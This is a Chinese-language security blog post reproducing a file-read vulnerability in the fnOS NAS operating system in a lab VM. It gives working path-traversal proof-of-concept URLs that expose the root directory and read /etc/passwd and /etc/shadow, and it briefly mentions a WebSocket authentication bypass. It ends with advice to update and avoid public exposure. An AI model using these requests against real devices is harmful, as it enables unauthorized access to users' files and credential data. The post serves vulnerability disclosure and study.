#  飞牛OS 漏洞复现  
原创 大表哥吆
                    大表哥吆  kali笔记   2026-02-03 04:20  
  
飞牛私有云fnOS是一款基于Debian Linux内核深度开发的国产、正版免费NAS操作系统。因其免费和程序资源丰富，吸引了很多的用户。但最近飞牛私有云fnOS出现严重0day漏洞，可以访问nas上任意文件（包括系统配置文件，用户存储文件）。本篇文章让我们一起来复现漏洞。  
  
注意：本文在虚拟机中环境中测试，文章内容仅仅用于研究和学习，坚决反对一切危害网络安全的行为。  
  
在虚拟机中，我安装的版本为0.9.9  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgNT2foqdcB6qlfibYxLknuYu6KY2IBP2exr7ZJcN28DxjZohHMBnNKMz3X1hZlHv2bgQx7CkVbjZQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgNT2foqdcB6qlfibYxLknuYuKWEIHNo7mscExSwmXvgdARKNiciaQ0QJBbLoA1kibib3HTWusAjnCVhqw/640?wx_fmt=png&from=appmsg "")  
  
![首页](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgNT2foqdcB6qlfibYxLknuYWytQbxykucPALx1KiaHJL1s88e4UOACtIjMXNWrlBnMTjezY4QwhtmQ/640?wx_fmt=png&from=appmsg "")  
  
首页  
# 复现  
  
在kali中访问飞牛IP地址，并用Burp抓包。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgNT2foqdcB6qlfibYxLknuYluUdjMwUsCJWKbd4cEmWx4KDLqC14BPxb4uN5GicY3m8ibPhC3Z211Tg/640?wx_fmt=png&from=appmsg "")  
  
在重发器中，构造POC:  
```
/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgNT2foqdcB6qlfibYxLknuYss7yTYxkU6YgM4QT55lAy1fZKJQpAUy76BfEZu0OxUCDzhevjSODbQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到系统的根目录。  
  
**查看/etc/passwd**  
```
/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgNT2foqdcB6qlfibYxLknuYtgDzDDjmIsROPaJM3ZXUtpZCZpSQO9pibkmKGtpzDTiaDshzr7HCpickg/640?wx_fmt=png&from=appmsg "")  
  
**查看etc/shadow**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgNT2foqdcB6qlfibYxLknuYEmsEvKG7LM6OROxsz9YbDS26WSHKIYzX1FyRNbWiaTgjsokoQ5n8ToA/640?wx_fmt=png&from=appmsg "")  
  
当然，也可以在浏览器中输入目录，直接进入。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgNT2foqdcB6qlfibYxLknuY0icBoDrtWe34X5TRWJzUiaQEfWaUPSkgdSrh2cw6fK8ILewnUO8J1QRw/640?wx_fmt=png&from=appmsg "")  
# 认证绕过  
  
在前端使用 Websocket 协议，可以生成 secret 和 token 绕过认证。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatgNT2foqdcB6qlfibYxLknuYKHq0nz5uEEjUwOWBWLc5ANFZJzPYficylhDsboAalQFtpE7khdNYIjA/640?wx_fmt=png&from=appmsg "")  
# 安全建议  
  
请及时更新到官方最新版。同时，尽量不要让设备暴露在公网。  
  
更多精彩文章 欢迎关注我们  
  
  
  
